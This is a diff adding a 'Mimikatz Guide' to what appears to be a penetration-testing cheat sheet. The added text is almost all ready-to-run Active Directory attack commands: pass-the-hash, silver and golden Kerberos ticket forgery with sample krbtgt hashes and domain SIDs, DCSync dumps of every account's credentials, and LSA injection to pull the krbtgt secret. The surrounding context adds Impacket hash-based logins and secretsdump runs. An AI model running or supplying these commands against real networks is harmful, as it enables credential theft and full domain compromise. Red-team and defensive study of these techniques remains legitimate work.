@@ -20,3 +20,26 @@
 | python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 Administrator@192.168.100.10 #with hash |
 | python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889  -just-dc acmebank.loca/Administrator@192.168.100.10 |
 
+
+### Mimikatz Guide
+
+| Pass-the-Hash  |
+| ------------- |
+|Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:ninja.corp  /target:ninja.corp /ntlm:a87f3a337d73085c45f9416be5787d86 /ptt "'|
+
+|Silver Tickets  |
+| ------------- |
+|kerberos::golden /user:Administrator /domain:testlab.local /sid:S-1-5-21-1516486103-3973840447-1748718438 /target:fs01 /rc4:47b1d9d581f29b3b43845692bd4a0322 /service:cifs /ptt|
+
+|Golden Tickets |
+| ------------- |
+|Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:ninja.corp /sid: S-1-5-21-3107064655-183826745-1492997513 /krbtgt:a89f4db26e65cdf4bb6cb6c1a1990eec /ptt" '|
+|Invoke-Mimikatz -Command '"kerberos::golden /user:evil /domain:ninja.corp /sid: S-1-5-21-3107064655-183826745-1492997513 /krbtgt:a89f4db26e65cdf4bb6cb6c1a1990eec /ptt" '|
+|Invoke-Mimikatz -Command '"kerberos::golden /user:MeMe /domain:ninja.corp /sid: S-1-5-21-3107064655-183826745-1492997513 /krbtgt:a89f4db26e65cdf4bb6cb6c1a1990eec /ptt" '|
+
+|DCSync |
+| ------------- |
+|lsadump::dcsync /domain:pentestlab.local /all /csv|
+|Invoke-Mimikatz -Command '"lsadump::dcsync /domain:insomnia.ninja.corp /all /csv"'|
+|Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'|
+|Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"'|
